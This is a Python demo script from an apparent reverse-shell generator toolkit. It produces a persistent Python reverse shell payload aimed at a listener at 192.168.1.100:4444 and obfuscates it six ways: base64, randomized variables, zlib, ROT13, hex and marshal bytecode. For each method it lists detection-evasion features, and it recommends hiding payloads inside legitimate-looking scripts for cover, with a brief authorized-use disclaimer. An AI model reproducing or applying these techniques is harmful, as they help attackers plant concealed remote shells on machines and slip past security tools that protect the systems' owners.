#!/usr/bin/env python3
"""
Demo script showing Python3 persistent payload encoding methods
This demonstrates how to make reverse shells less suspicious
"""

import sys
import os

# Add utils directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'utils'))

from utils.generator import PayloadGenerator
from utils.helpers import obfuscate_payload
from utils.banner import print_banner, print_success, print_info, Colors

def demo_encoding_methods():
    """Demonstrate all Python encoding methods"""
    
    print_banner("matrix")
    print(f"\n{Colors.BOLD}{Colors.NEON_CYAN}🔐 Python3 Persistent Payload Encoding Demo{Colors.RESET}")
    print("=" * 70)
    
    # Generate original payload
    generator = PayloadGenerator()
    ip = "192.168.1.100"
    port = 4444
    
    try:
        original_payload, info = generator.generate_payload(ip, port, "python3_persistent")
        print(f"\n{Colors.BOLD}{Colors.YELLOW}📋 ORIGINAL PAYLOAD:{Colors.RESET}")
        print(f"{Colors.RED}{original_payload}{Colors.RESET}")
        print(f"\n{Colors.DIM}Length: {len(original_payload)} characters{Colors.RESET}")
        
        # Demo each encoding method
        encoding_methods = [
            ("base64", "🔐 Standard Base64 Encoding"),
            ("python_stealth", "🎭 Advanced Stealth (Random Variables)"),
            ("python_zlib", "🗜️  Zlib Compression + Base64"),
            ("python_rot13", "🔄 ROT13 + Base64 Double Encoding"),
            ("python_hex", "🔢 Hex Encoding with bytes.fromhex()"),
            ("python_marshal", "📦 Marshal Bytecode Obfuscation")
        ]
        
        for method, description in encoding_methods:
            print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.RESET}")
            print(f"{Colors.BOLD}{description}{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.RESET}")
            
            try:
                encoded_payload = obfuscate_payload(original_payload, method)
                print(f"{Colors.GREEN}{encoded_payload}{Colors.RESET}")
                print(f"\n{Colors.DIM}Length: {len(encoded_payload)} characters{Colors.RESET}")
                
                # Calculate obfuscation ratio
                ratio = len(encoded_payload) / len(original_payload)
                if ratio < 1.2:
                    size_info = f"{Colors.GREEN}Compact (x{ratio:.1f}){Colors.RESET}"
                elif ratio < 2.0:
                    size_info = f"{Colors.YELLOW}Moderate (x{ratio:.1f}){Colors.RESET}"
                else:
                    size_info = f"{Colors.RED}Large (x{ratio:.1f}){Colors.RESET}"
                
                print(f"{Colors.DIM}Size ratio: {size_info}{Colors.RESET}")
                
                # Show detection evasion features
                evasion_features = get_evasion_features(method)
                if evasion_features:
                    print(f"\n{Colors.BOLD}{Colors.MAGENTA}🛡️  Evasion Features:{Colors.RESET}")
                    for feature in evasion_features:
                        print(f"  • {feature}")
                
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}✅ Encoding Demo Complete!{Colors.RESET}")
        print(f"\n{Colors.BOLD}{Colors.YELLOW}💡 Recommendations:{Colors.RESET}")
        print("  • Use 'python_marshal' for maximum stealth (bytecode level)")
        print("  • Use 'python_zlib' for smaller payload size")
        print("  • Use 'python_stealth' for variable name randomization")
        print("  • Combine with legitimate-looking Python scripts for better cover")
        
        print(f"\n{Colors.BOLD}{Colors.RED}⚠️  Remember:{Colors.RESET}")
        print("  • Only use on systems you own or have explicit permission to test")
        print("  • These methods may still be detected by advanced security tools")
        print("  • Always follow responsible disclosure practices")
        
    except Exception as e:
        print(f"{Colors.RED}❌ Error generating payload: {e}{Colors.RESET}")

def get_evasion_features(method):
    """Get evasion features for each method"""
    features = {
        "base64": [
            "Standard base64 encoding",
            "Commonly used, moderate detection evasion"
        ],
        "python_stealth": [
            "Random variable names generated each time",
            "Base64 encoding with import aliasing",
            "Dynamic obfuscation pattern"
        ],
        "python_zlib": [
            "Data compression reduces payload size",
            "Uses legitimate compression library",
            "Less obvious than pure base64"
        ],
        "python_rot13": [
            "Double encoding (ROT13 + Base64)",
            "Multiple decoding steps",
            "ROT13 appears as legitimate text encoding"
        ],
        "python_hex": [
            "Uses bytes.fromhex() - legitimate Python method",
            "Hex encoding is common in programming",
            "Compact representation"
        ],
        "python_marshal": [
            "Bytecode-level obfuscation",
            "Hardest to analyze statically",
            "Uses Python's internal serialization",
            "Appears as compiled Python code"
        ]
    }
    return features.get(method, [])

def show_usage_examples():
    """Show practical usage examples"""
    print(f"\n{Colors.BOLD}{Colors.BLUE}📖 USAGE EXAMPLES:{Colors.RESET}")
    print("─" * 50)
    
    print(f"\n{Colors.BOLD}1. Interactive Mode with Encoding:{Colors.RESET}")
    print(f"   {Colors.CYAN}python3 interactive_revgen.py{Colors.RESET}")
    print("   • Select 'Python3 (Persistent)'")
    print("   • Choose encoding method (1-7)")
    print("   • Copy encoded payload")
    
    print(f"\n{Colors.BOLD}2. CLI Mode with Specific Encoding:{Colors.RESET}")
    print(f"   {Colors.CYAN}python3 revgen.py --ip 192.168.1.100 --port 4444 --lang python3_persistent --obfuscate{Colors.RESET}")
    
    print(f"\n{Colors.BOLD}3. Programmatic Usage:{Colors.RESET}")
    print(f"   {Colors.CYAN}from utils.helpers import obfuscate_payload{Colors.RESET}")
    print(f"   {Colors.CYAN}encoded = obfuscate_payload(payload, 'python_marshal'){Colors.RESET}")

if __name__ == "__main__":
    try:
        demo_encoding_methods()
        show_usage_examples()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}🧞‍♂️ Demo interrupted. Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Demo error: {e}{Colors.RESET}")
